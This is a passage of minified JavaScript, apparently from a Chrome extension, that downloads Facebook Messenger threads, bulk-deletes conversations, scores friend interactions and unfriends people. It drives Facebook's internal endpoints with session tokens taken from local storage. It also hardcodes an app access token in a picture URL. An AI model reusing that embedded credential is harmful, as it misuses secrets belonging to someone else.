")),"");e.all_participants.nodes.forEach((e=>{this.senderImgs[e.messaging_actor.id]||(this.senderImgs[e.messaging_actor.id]=e.messaging_actor.profile_picture?e.messaging_actor.profile_picture.uri:e.messaging_actor.big_image_src.uri)})),this.messageThreads[t]={name:s,uid:t,count:e.messages_count,type:"Group",image:e.image?e.image.uri:null,selected:!1}}else"ONE_TO_ONE"===e.thread_type&&this.messageThreads[t]&&(this.messageThreads[t]={name:e.all_participants.nodes[0].messaging_actor.name,uid:t,count:e.messages_count,type:"1:1",image:e.all_participants.nodes[0].messaging_actor.profile_picture?e.all_participants.nodes[0].messaging_actor.profile_picture.uri:e.all_participants.nodes[0].messaging_actor.big_image_src.uri,selected:!1},this.senderImgs[t]=this.messageThreads[t].image)},this.getCountForInbox=()=>{const e=new FormData;e.append("fb_dtsg",localStorage.dt),e.append("q","viewer(){message_threads{count,nodes{customization_info{emoji,outgoing_bubble_color,participant_customizations{participant_id,nickname}},all_participants{nodes{messaging_actor{name,id,profile_picture}}},thread_type,name,messages_count,image,id}}}"),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:e,cancelToken:this.axiosSource.token}).then((e=>{if(null===(e=e.data).viewer.message_threads||!e.viewer.message_threads.nodes.length)return console.log("Falling back to 1475048592613093"),this.getCountHelper(Date.now(),'["INBOX"]');e.viewer.message_threads.nodes.forEach((e=>this.spreadData(e))),this.updateTable()})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");console.log("Falling back to 1475048592613093"),this.getCountHelper(Date.now(),'["INBOX"]')}))},this.getCountHelper=(e,t)=>{const s=new FormData;s.append("fb_dtsg",localStorage.dt),s.append("queries",'{"o0":{"doc_id":"1475048592613093","query_params":{"limit":500,"before":'.concat(e,',"tags":').concat(t,',"includeDeliveryReceipts":true,"includeSeqID":false}}}')),L()({method:"POST",url:"https://www.facebook.com/api/graphqlbatch/",data:s,cancelToken:this.axiosSource.token}).then((e=>{if(e=e.data,!(e=ue(e.split("\n")[0])))return this.updateTable();{if((e=e.o0.data.viewer.message_threads.nodes).forEach((e=>this.spreadData(e))),1===e.length||0===e.length)return this.updateTable();const s=e[e.length-1].updated_time_precise;this.getCountHelper(s,t)}})).catch((e=>L.a.isCancel(e)?console.log("Loc is the best"):(console.log("Failed to fetch messages for ".concat(t)),this.updateTable())))},this.updateTable=()=>{const e=this.state.updateTableCallCount+1;this.setState({updateTableCallCount:e}),e<2||this.setState({show:!0,selection:this.messageThreads,data:Object.values(this.messageThreads).filter((e=>e.count>0))},(()=>{const e=document.querySelector("select"),t=document.createElement("option");t.appendChild(document.createTextNode("All rows")),t.setAttribute("value",this.state.data.length),e.appendChild(t)}))},this.downloadThread=(e,t,s,a,i,n)=>{this.setState({idle:!0,fetch:!0},(()=>{this.fetchThread(e,t,s,a,i,n)}))},this.fetchThread=(e,t,s,a,i,n)=>{const c=s>=499?499:s;(i+=c)>s&&(i=s);const r=new FormData;r.append("fb_dtsg",localStorage.dt),r.append("queries",'{"o0":{"doc_id":"1526314457427586","query_params":{"id":"'.concat(t,'","message_limit":').concat(c,',"load_messages":true,"load_read_receipts":true,"before":').concat(a,"}}}")),L()({method:"POST",url:"https://m.facebook.com/api/graphqlbatch/",data:r,cancelToken:this.axiosSource.token}).then((c=>(c=c.data,(c=ue(c.split("\n")[0]))?(this.setState({progress:parseInt(100*i/s)}),n.length<s&&(n=[...c.o0.data.message_thread.messages.nodes,...n],a=c.o0.data.message_thread.messages.nodes[0].timestamp_precise),c.o0.data.message_thread.messages.page_info.has_previous_page?this.fetchThread(e,t,s,a,i,n):(W(n,e,1,this.senderImgs),this.setState({idle:!1,fetch:!1,progress:0}),void this.notify("Downloaded conversation successfully!"))):n.length?(W(n,e,1,this.senderImgs),this.setState({idle:!1,fetch:!1,progress:0}),this.notify("Uh oh! Something went wrong! Downloaled partial of your conversation!")):this.notify("Uh oh! Something went wrong! Contact Loc for help!")))).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");console.log(e)}))},this.deleteThread=e=>{const t=[],s=new FormData,a=e.length>100?100:e.length;for(let i=0;i<a;i++){const a=e.pop();t.push(a),s.append("ids[".concat(i,"]"),a)}s.append("fb_dtsg",localStorage.dt),s.append("dpr",1),s.append("__a",1),L()({method:"POST",url:"https://www.facebook.com/ajax/mercury/delete_thread.php",data:s}).then((s=>{if(s=s.data,!(s=ue(s.slice(9))).error){const e=[...this.state.data],s=[];e.forEach((e=>{t.includes(e.uid)?delete this.messageThreads[e.uid]:s.push(e)})),this.setState({data:s})}if(e.length)return this.notify("Deleted ".concat(a," conversations, ").concat(e.length," more to go!")),this.deleteThread(e);const i=s.error?"".concat(s.errorSummary):"Success!";this.setState({idle:!1}),this.notify("Finished!"),this.setAlert("Finished",i,s.error?"error":"success")})).catch((()=>{this.setAlert("Error","Uh oh, contact Loc for help!","error"),this.setState({idle:!1})}))},this.buildFriend=(e="")=>{L()({method:"GET",url:"https://graph.facebook.com/me/friends",params:{fields:"id",limit:500,access_token:localStorage.touch,after:e}}).then((e=>{if((e=e.data).data.forEach((e=>{this.messageThreads[e.id]={uid:e.id,count:0,selected:!1}})),e.paging.next)return this.buildFriend(e.paging.cursors.after);this.getCountForInbox(),this.getCountHelper(Date.now(),'["ARCHIVED"]')})).catch((e=>L.a.isCancel(e)?console.log("Loc is the best"):(this.setState({error:"Oops, something went wrong."}),this.setAlert("Error","Something went south, contact Loc for help","error"))))},this.componentDidMount=()=>{pe().then((e=>{De.a.decrypt(this.state.locmai,e)===this.state.locmai?(ga_trackButtonClick("premium_msg_count"),this.setState({aw2721d:!0}),this.getCountForInbox(),this.getCountHelper(Date.now(),'["ARCHIVED"]')):(ga_trackButtonClick("msg_count"),this.setState({aw2721d:!1}),this.buildFriend())})).catch((()=>{this.setState({aw2721d:null})}))},this.resetCheckbox=()=>{if(!this.checkboxTable)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.messageThreads);for(let o=a;o<i;o++)if(!r[e.sortedData[o].uid].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.messageThreads);for(let o=i;o<n&&(r[t.sortedData[o].uid].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.messageThreads);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.confirmDeleteConversations=()=>{if(0===this.state.data.length)return this.setAlert("Ouch","Nothing else to delete","success");const e=[];if(Object.keys(this.state.selection).forEach((t=>{this.state.selection[t].selected&&e.push(this.state.selection[t].uid)})),0===e.length)return this.setAlert("Ouch","No conversation got selected","success");this.setState({alert:Object(f.jsxs)(p.a,{warning:!0,style:{display:"block"},title:"Are you sure?",onConfirm:()=>{this.hideAlert(),this.setState({idle:!0}),this.deleteThread(e)},onCancel:()=>this.hideAlert(),confirmBtnBsStyle:"success",cancelBtnBsStyle:"danger",confirmBtnText:"Yes, delete them!",cancelBtnText:"Cancel",showCancel:!0,btnSize:"",children:[e.length," selected conversation",e.length>1&&"s"," will be deleted!"]})})},this.messageThreads={},this.state={show:!1,data:[],idle:!1,alert:!1,progress:0,fetch:!1,error:null,aw2721d:null,updateTableCallCount:0,selection:{},selectAll:!1,locmai:localStorage.id};const t=L.a.CancelToken;this.axiosSource=t.source(),this.senderImgs={}}render(){let e;e=this.state.error?Object(f.jsx)("h1",{className:"text-center",children:this.state.error}):this.state.show?Object(f.jsx)(Se.a,{data:this.state.data,ref:e=>this.checkboxTable=e,onFetchData:()=>this.resetCheckbox(),noDataText:"Loc couldn't find any data ._.",filterable:this.state.aw2721d,sortable:this.state.aw2721d,defaultSorted:[{id:"count",desc:!0}],resizable:!1,columns:[{Header:"Name",Cell:e=>Object(f.jsxs)("div",{children:[Object(f.jsx)("img",{src:e.original.image?e.original.image:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAqKSURBVGhD7Vl5cBPXGf92Vytbh2+bwwbjYLA5wg0BBkggZWAgQDjCJIFSQqBMmzQtR8ENTAolUI5JQoBM2kxpQ2ISILQppG0wV2hDIZOBgTDQhCPUAdsY40uyLUva1e72+1YrWceukQ/gj+Y3syPpvd233/393hN8j+9xb8Bon23G2jVvMPKo+bk1PusYGdjBsqzkgCxlSgprVxSG4VjZDQxTxrJMMccoFxM476mMO+e/XjZvnKQt0Sa0WZHVR2seqhUti2WZmSbKbG9AqbUp/IqX+gUvHGXD3sYAb4JyBuQ9ibyncPOE5K+0iVah1YqsPFLX2+Ex/xqt/5SiKCYSulGkSwHBByDIABJeoSBFeA4g3gRgMTFgNfvHFBTDzMqf2sy+Da9PtJ/Wbm8RWqzIxpPVtu+c9g0o5AsoPC9gYDjcCjQIALJq/pbBjsokxTNg4f2/eU55L93iLlj/g5QK/0hsaJEiyw7VD2rw8bslmenjQ2tXufwKtAesqEialYE49BbLQo3V5Ju7bZKtSJu+K2JWZElR45wGgfsDesFaix6ocftzoL2RYgFIRYUIVt63/K3JtjfUH3dBTIr87FP3Tzw+docsg+kOeqHeq03cI1CYdbIzwLH0XV7/1mTLK9qUIe6qyEtF7rlugd2FOWEqr1PAjYl8P8CjEplJWNnw02qWCnZMsm7RpnTRrCLLixzDnILlBHrCVoZKeO6TEgGYUIkuqAx92szijO2T7Ae0qSjgLfpYe/y2vV60FGIe2Cic7rcSBCoot+sVtQ25febdKw9XZ/tnomGoyB23fTWGU77Tc+9zojmQAavRkMgUbE7B+uaSTa/pRpGuIisPVw4QZPNyEXtEVaM2+ADh8KBHsNn6ZHaG0n/xE9pwGHQVqRdtBdit+Ross20psflpDCwdYYJfjjTByC4scDHVSH1UNfoF8UqmNau2/ylK7qilV/79Zn6N3OmSR1RMJc7WaZGA3XrpSB4e7x7+PgrRjZ+LcLo0grvEiE4JjMoE7Lxn4rbJSUe0YRVRmtXLKc8Qd3J69ZWgUbo62hhIszDq91DEI5d6d7o5SglCQhw2VvSOnmdoHeJg2YnYPww8R/lKcIvcAvVLCMIeeeb5XzCJ0zddwVjsWVyLCRYhZQcU/qdDOazrDDySxSIrB/jrNxLs+NIXvJfC6Z1paLZm8Ox+Acobmhaf24+DXuksDOjEQCLyLir1rxwX4b+OCAEQ3ZKRxvCsN9VxtsPmeSPrtOFwj2RNWdpLAq4HsVg9AvibsSYY152D4RjvpARhRm8OZuIVgDeGMh2ad+PRcz8eaoIxOayqBCELvbLucV7XMy6BKpgc15iU95g2pCJMkQYmZTjtJ9xIxSOREg/QKyM6XAhjUYiAcNRzmmPBHjRSNRaRAIahZ/VAjTA3JVoTMjJBUOJG+b/5Eb4KwwymD73mZ0HzBLwQCTuGWkC0FMwbamRG8EpKkLIT7LzBooiEuOi5gGyYxwP93/wIU0RhuB70Sf0jEs3VGaQwQVDFMjdFWhRIOHPIVhH1MoSeQcjb6jMMm5/fc1RwoTBFZFnKohDRW5yYqBHi0cKBFa9U0x7FWLoSTOBKrScQiBQawYJVTA+080Sjp+X06x70bXCZ5I59GIbhbEYiEK02QmdMzgxtD0HPr/1MP+NJgDUnxGCIktE6Y28wwsMd9LUkrzAMa7Z2HhIsj8E7JQl3SmRYA02GZhqbjkQZ3a1p/nKVrJvwLiwiN7G0BtAVDZCN5dQI1IuaYxayIgUfDr7d7bwFiuxzGyX0DYcMDQZNkoROw51dAPVYWf59IzrAj12Xw8KWmu63GIpG8G+stB8a6G4SWlFkofLqF0HXBxWRRJXiVpAi4cc2fhShENP2CDAHm1l1SIyvKBJhxh4v7DzfVCHo8eLaaEVI6NCl63G/v+gTAWbiuudvNd2/9ZQPZu0V4Gl8V2QFpefVfJV8tdcvndWKcYgiJJoi+b6j73RkEwp6uH8HBhYMNEHBaJN6SBDArL4c9MNYTkL6EQCFQ6ZO7FOjC7U/5dXUPA7mD+Kgb8egKDD7YQ5GZbPQRWcNMjIpgoXpRuWdJtIWJvKgmUt6Mrx1Ah3xBDp0Fi62eQIPP0IlBnRiVeIWigykLb4Quj+xB6cqPDqHi+o7/fH57sksWLEaVWNKdsOmNwZza3wuF1ayqcOP7MrCzD6cmpsXKxSo0/ZEVCETqb/4Gg+f+2jzP3BItU3Yq3649diIuNxHv6hHclaBXIgmdz5phtzUCIkQlBcHkWftvSTBQORIk9Gy/dGqRjkWCXr7mRIZDlyR4HKlAs+hV6bkc7phfb1ahoWf+KMoVTtlkRw3nts1P+89dRDR5E9E0ebnLzCyWG7DokbrEUXQU4Ia1fp/iiphXDfOBC8/yqveilUJAt36CFr9t+N5fN4E71+QYMO/RN1ql5vGqkybYEMWge8Rq786dEId0BD5am7BnvLfs9bURbRXpsO30NgPgB6yILX43VQekjWi11bcwrK8+G+C6hE9r1BoUfPsiuVaERpO7Ho6YyKSx+hk1yC5S87txs6o0DEmwYkLRF4OvJ5F6t1eShAysRAQiyaBaWsbeZGnEpG4EkRH2YeoRFg9i1QE9hVM+VLxNpyi+h1ZwwOgqtQTQ45Ycnte3cna2jsiQZWUkpyRvMVndi7/Cw6F3apnUmbO9pNPWnKGf4zbXabUYLvblv13czAikR2RItEOU6j8dkXhor5bcSiM2hqJY1mw9/Ze1pIyjZpfrcpeHhxon05lHyPl7KGC0RPKi7+p1aaCiAotDZ5LhQUrsENWU/OjvfSDAp0yZqA3SI3KS8d/hUo4takwGO4cbl27UJc3amplXFLnJ7Dksa39/6MtoOqVpZ3/CtU3Nu1f9tgHOBysVKEw8ghB3PfSiL2NFVe3cJgQRC/IOvcLpARRfOr4Yl1F4UcvDn4dh7F+6eNuork+XNxvi1BV/DZVja5oHfoj5l6DDEaGo6rpq6v4+NDL41Z43S7dkAog1tqTMuedi6usnfOWYellK10KOA1t0zZQYlNOUFX01pa+X7R6fEFVWfEdnIqm0yGIVRFC8lNbT85LemjIq8BwSXSaQRUtluOfWEBeSMfCYscSS73bdfvalj//fNg20eupwelmlSAYJrsOPF8ffvc/ZqHmaHre8J5mizWH6IsZTUfcq7mTk+ZAOZCGDLoDeoHCVhFdF8tO73vhwKpJH8iSz4G3xFRiWuKRAChLUme99tnspG4DX2Ti7PTfunry0iBQh/ZvAaixkQSRL6AkJoHpz08r8rVgzkne0rrSy28fWTe90Fl1qxJHkKzEjtYoQqDn4jnOlDL11YOTk7IHzOYT0scg8Q9ueEkROmwIlGyqKrQhCj2NIRYrNdaeqSu7tv/zNxcerCy5Sgq48IrJC6ForSIB0PPEjxMyc/unD1+4cay1Y48hvDWpF8vHZ7MmczLDcip/VmRJVCTRiVvqUl+j47KrquTc9aN/PH3x2J6biqLU4y1UPloZoG1XJBSUb0QziaPGcSYzb7UnxCWkdjGzLMe46irEBkeNRxTo0FShf+eJ+FBza5dy0Z6KRCKwdug7KGRaHDb/RwD4Hw2pOfjtq1UCAAAAAElFTkSuQmCC",alt:"",style:{marginRight:"15px",width:"50px",height:"50px"}}),Object(f.jsx)("a",{href:"https://www.facebook.com/messages/t/".concat(e.original.uid),rel:"noopener noreferrer",target:"_blank",children:Object(f.jsx)("span",{children:e.original.name})})]}),accessor:"name",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"Thread ID",id:"uid",accessor:e=>parseInt(e.uid),maxWidth:200},{Header:"Count",accessor:"count",maxWidth:150,filterMethod:(e,t)=>be(e,t)},{Header:"Type",accessor:"type",maxWidth:150,filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"Action",maxWidth:150,sortable:!1,filterable:!1,Cell:e=>Object(f.jsx)(u.a,{className:"btn-icon btn-link",color:"info",size:"sm",disabled:this.state.idle,onClick:()=>this.downloadThread(e.original.name,e.original.uid,e.original.count,Date.now(),0,[]),children:Object(f.jsx)("i",{className:"tim-icons icon-cloud-download-93"})})},{Header:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",onChange:this.handleChange,checked:this.state.selectAll,disabled:this.state.idle}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),Cell:e=>Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",checked:this.state.selection[e.original.uid].selected,disabled:this.state.idle,onChange:()=>this.handleSingleCheckboxChange(e.original.uid)}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),sortable:!1,filterable:!1,maxWidth:25}],defaultPageSize:10,showPaginationTop:!0,showPaginationBottom:!1,className:"-striped -highlight"}):Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("h1",{className:"text-center",children:"Please wait, counting your messages..."}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})]});let t=null;return null!==this.state.aw2721d?t=Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsxs)(M.a,{children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)("div",{className:"info-icon text-center icon-info",children:Object(f.jsx)("i",{className:"fab fa-facebook-messenger"})})}),Object(f.jsx)(R.a,{md:"8",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)("p",{className:"card-category",children:"Message Downloader"}),Object(f.jsxs)(H.a,{tag:"h3",children:["v",chrome.app.getDetails().version]})]})}),!1===this.state.aw2721d&&Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("blockquote",{children:Object(f.jsx)("p",{className:"blockquote blockquote-danger",children:"Become a Premium user to see message count and download message from non-friends, groups, and even blocked or deactivated users."})}),Object(f.jsx)("br",{})]}),!0===this.state.aw2721d&&this.state.show&&Object(f.jsx)(ze,{senderImgs:this.senderImgs})]}),Object(f.jsx)("hr",{}),this.state.show&&Object(f.jsx)(z.a,{children:Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)("div",{className:"numbers",children:Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:this.confirmDeleteConversations,disabled:this.state.idle,children:"Delete"})})})}),this.state.fetch&&Object(f.jsxs)("div",{className:"progress-container progress-success",children:[Object(f.jsx)("span",{className:"progress-badge",children:"Fetching..."}),Object(f.jsx)(Pe.a,{max:"100",value:this.state.progress,children:Object(f.jsxs)("span",{className:"progress-value",children:[this.state.progress,"%"]})})]}),e]})}):null===this.state.aw2721d&&(t=Object(f.jsx)(E.a,{children:Object(f.jsxs)(M.a,{children:[Object(f.jsx)("h1",{className:"text-center",children:"Please wait, fetching data..."}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})]})})),Object(f.jsxs)("div",{className:"content",children:[Object(f.jsx)("div",{className:"rna-container",children:Object(f.jsx)(Re.a,{ref:"notificationAlert"})}),this.state.alert,Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(je,{stats:!1})}),Object(f.jsx)(R.a,{md:12,children:t})]})]})}}var Qe=Ge;const Ye=[{label:"UID",key:"uid"},{label:"Name",key:"name"},{label:"Last talked",key:"activity.lastMessage"},{label:"Last comment",key:"activity.lastComment"},{label:"Last reaction",key:"activity.lastReaction"},{label:"Comments",key:"commentCount"},{label:"Reactions",key:"reactionCount"},{label:"Messages",key:"messageCount"}];class Ve extends n.a.Component{constructor(e){super(e),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.storeData=(e,t)=>{this.friendData=this.state.selection;const s=!1===this.state.aw2721d?"interactionData":"premiumInteractionData";t?chrome.storage.local.set({[s]:{uid:localStorage.id,timestamp:e,data:this.state.data,friendData:this.friendData,version:chrome.app.getDetails().version,start:this.state.start,end:this.state.end}}):chrome.storage.local.get([s],(t=>{if(t&&t[s]){const a=t[s].start,i=t[s].end;chrome.storage.local.set({[s]:{uid:localStorage.id,timestamp:e,data:this.state.data,friendData:this.friendData,version:chrome.app.getDetails().version,start:a,end:i}})}}))},this.componentDidMount=()=>{pe().then((e=>{let t=null;if(De.a.decrypt(this.state.locmai,e)===this.state.locmai?(ga_trackButtonClick("premium_interaction_scanner"),this.setState({aw2721d:!0}),t="premiumInteractionData"):(ga_trackButtonClick("interaction_scanner"),this.setState({aw2721d:!1}),t="interactionData"),!t)return this.notify("error","Something went wrong, contact me for help!");chrome.storage.local.get([t],(e=>{if(e&&e[t]&&e[t].timestamp&&e[t].data&&e[t].uid===localStorage.id&&e[t].friendData&&e[t].version===chrome.app.getDetails().version){const s=e[t].friendData;Object.keys(s).forEach((e=>s[e].selected=!1)),this.friendData=s,this.setState({gotData:!0,lastUpdated:e[t].timestamp,data:e[t].data,selection:s,start:e[t].start,end:e[t].end})}}))})).catch((()=>{this.setState({aw2721d:null})}))},this.notify=(e,t)=>{const s={place:"tr",message:Object(f.jsx)("div",{children:t}),type:e,icon:"tim-icons icon-bell-55",autoDismiss:5};this.refs.notificationAlert.notificationAlert(s)},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.resetCheckbox=()=>{if(!this.checkboxTable||!1===this.state.aw2721d)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.friendData);for(let o=a;o<i;o++)if(!r[e.sortedData[o].uid].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.friendData);for(let o=i;o<n&&(r[t.sortedData[o].uid].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.friendData);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.postTable=()=>{const e=this.state.updateTableCallCount+1;if(this.setState({updateTableCallCount:e}),e<4)return;const t=Date.now();this.setState({loading:!1,gotData:!0,lastUpdated:t,data:Object.keys(this.friendData).map((e=>({name:this.friendData[e].name,uid:e,image:"https://graph.facebook.com/".concat(e,"/picture?height=500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662"),messageCount:this.friendData[e].message,reactionCount:this.friendData[e].reaction,commentCount:this.friendData[e].comment,addedSince:this.friendData[e].addedSince?"Added on ".concat(q()(this.friendData[e].addedSince).format("L")):"",activity:{lastComment:this.friendData[e].lastComment?"Last commented on ".concat(q()(this.friendData[e].lastComment).format("L")):"",lastReaction:this.friendData[e].lastReaction?"Last reaction on ".concat(q()(this.friendData[e].lastReaction).format("L")):"",lastMessage:this.friendData[e].lastMessage?"Last talked on ".concat(q()(this.friendData[e].lastMessage).format("L")):""}})))},(()=>{this.notify("success","Jobs done"),this.storeData(t,!0);const e=document.querySelector("select"),s=document.createElement("option");s.appendChild(document.createTextNode("All rows")),s.setAttribute("value",this.state.data.length),e.appendChild(s)}))},this.spreadData=e=>{const t=e[localStorage.id];let s=!1;t&&t.timeline_feed_units&&t.timeline_feed_units.edges&&t.timeline_feed_units.edges.forEach((e=>{1e3*e.node.creation_time>=this.state.start?(e.node&&e.node.feedback&&e.node.feedback.reactors&&e.node.feedback.reactors.nodes&&e.node.feedback.reactors.nodes.forEach((t=>{t.id&&this.friendData[t.id]&&(this.friendData[t.id].reaction++,1e3*e.node.creation_time>this.friendData[t.id].lastReaction&&(this.friendData[t.id].lastReaction=1e3*e.node.creation_time))})),e.node&&e.node.feedback&&e.node.feedback.commenters&&e.node.feedback.commenters.nodes&&e.node.feedback.commenters.nodes.forEach((t=>{t.id&&this.friendData[t.id]&&(this.friendData[t.id].comment++,1e3*e.node.creation_time>this.friendData[t.id].lastComment&&(this.friendData[t.id].lastComment=1e3*e.node.creation_time))}))):s=!0})),!s&&t&&t.timeline_feed_units&&t.timeline_feed_units.page_info&&t.timeline_feed_units.page_info.has_next_page?this.buildFeed(t.timeline_feed_units.page_info.end_cursor):this.postTable()},this.buildFeed=(e="")=>{const t="node(".concat(localStorage.id,"){timeline_feed_units.first(").concat(this.limit,").after(").concat(e,"){page_info,edges{node{id,creation_time,feedback{reactors{nodes{id,name}},commenters{nodes{id,name}}}}}}}"),s=new FormData;s.append("fb_dtsg",localStorage.dt),s.append("q",t),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:s,cancelToken:this.axiosSource.token}).then((e=>{if((e=e.data).error)return this.setAlert("Error",e.error.summary,"error");this.spreadData(e)})).catch((t=>{if(L.a.isCancel(t))return console.log("Loc is the best");this.limit=parseInt(this.limit/5),this.limit<1&&(this.limit=1),this.buildFeed(e)}))},this.getCountForInbox=()=>{const e=new FormData;e.append("fb_dtsg",localStorage.dt),e.append("q","viewer(){message_threads{nodes{thread_key{thread_fbid,other_user_id},messages_count,thread_type,updated_time_precise}}}"),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:e,cancelToken:this.axiosSource.token}).then((e=>{if(null===(e=e.data).viewer.message_threads||!e.viewer.message_threads.nodes.length)return console.log("Falling back to 1475048592613093"),this.getCountHelper(Date.now(),'["INBOX"]');e.viewer.message_threads.nodes.forEach((e=>{if("ONE_TO_ONE"===e.thread_type){const t=e.thread_key.other_user_id;this.friendData[t]&&(this.friendData[t].message=e.messages_count,this.friendData[t].lastMessage=1*e.updated_time_precise)}})),this.postTable()})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");console.log("Falling back to 1475048592613093"),this.getCountHelper(Date.now(),'["INBOX"]')}))},this.getCountHelper=(e,t)=>{const s=new FormData;s.append("fb_dtsg",localStorage.dt),s.append("queries",'{"o0":{"doc_id":"1475048592613093","query_params":{"limit":500,"before":'.concat(e,',"tags":').concat(t,',"includeDeliveryReceipts":true,"includeSeqID":false}}}')),L()({method:"POST",url:"https://www.facebook.com/api/graphqlbatch/",data:s,cancelToken:this.axiosSource.token}).then((e=>{if(e=e.data,e=ue(e.split("\n")[0])){if((e=e.o0.data.viewer.message_threads.nodes).forEach((e=>{if("ONE_TO_ONE"===e.thread_type){const t=e.thread_key.other_user_id;this.friendData[t]&&(this.friendData[t].message=e.messages_count,this.friendData[t].lastMessage=1*e.updated_time_precise)}})),1===e.length||0===e.length)return this.postTable();const s=e[e.length-1].updated_time_precise;this.getCountHelper(s,t)}else this.postTable()})).catch((e=>L.a.isCancel(e)?console.log("Loc is the best"):(console.log("Failed to fetch messages for ".concat(t)),this.postTable())))},this.fetchFriend=e=>{if(e.data.forEach((({name:e,id:t})=>{this.friendData[t]=Object(a.a)(Object(a.a)({},this.friendData[t]),{},{uid:t,name:e,reaction:0,comment:0,message:0,selected:!1,lastComment:null,lastReaction:null,lastMessage:null,addedSince:null})})),e.paging&&e.paging.next)return this.buildFriend(e.paging.cursors.after);this.setState({selection:this.friendData},(()=>{this.notify("info","Fetching..."),this.buildFeed(),!1===this.state.aw2721d?this.setState({updateTableCallCount:3}):!0===this.state.aw2721d&&(this.fetchAddedFriendTimestamp(parseInt(Date.now()/1e3)),this.getCountHelper(Date.now(),'["ARCHIVED"]'),this.getCountForInbox())}))},this.buildFriend=(e="")=>{this.setState({statusMessage:"Gathering data..."}),L()({method:"GET",url:"https://graph.facebook.com/me/friends",params:{limit:500,access_token:localStorage.touch,after:e}}).then((t=>(t=t.data).error?(this.setState({loading:!1}),this.postTable(),this.setAlert("Error",t.error.message,"error")):""===e&&0===t.data.length?(this.postTable(),this.setAlert("Error","You got no friends, LOL!","error")):void this.fetchFriend(t))).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");this.buildFeed()}))},this.scan=()=>{this.friendData={},this.setState({data:[],selection:{},selectAll:!1,alert:!1,gotData:!1,statusMessage:"Please wait, updating data...",lastUpdated:null,updateTableCallCount:0,end:Date.now(),loading:!0}),this.buildFriend()},this.removeFriends=e=>{const t=e.pop();if(!t)return this.setState({selectAll:!1,loading:!1}),this.setAlert("Finished","Job's done!","success");const s=t.uid,a=new FormData;a.append("__user",localStorage.id),a.append("__a",1),a.append("dpr",1),a.append("fb_dtsg",localStorage.dt),a.append("fb_api_caller_class","RelayModern"),a.append("fb_api_req_friendly_name","FriendingCometUnfriendMutation"),a.append("doc_id",0x83b3b0ed6a6d0),a.append("variables",'{"input":{"source":"bd_profile_button","unfriended_user_id":"'.concat(s,'","actor_id":"').concat(localStorage.id,'","client_mutation_id":"1"},"scale":1}')),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:a,cancelToken:this.axiosSource.token}).then((s=>{if((s=s.data).data){if(s.data.friend_remove){const s="\ud83d\udc4b ".concat(t.name,": removed.\n").concat(this.state.results),a=this.state.data.filter((e=>e.uid!==t.uid)),i=this.state.selection;i[t.uid]&&delete i[t.uid],this.setState({data:a,selection:i,results:s},(()=>{this.storeData(Date.now(),!1),this.removeFriends(e)}))}else if(s.errors){const a="\u274c ".concat(t.name,": 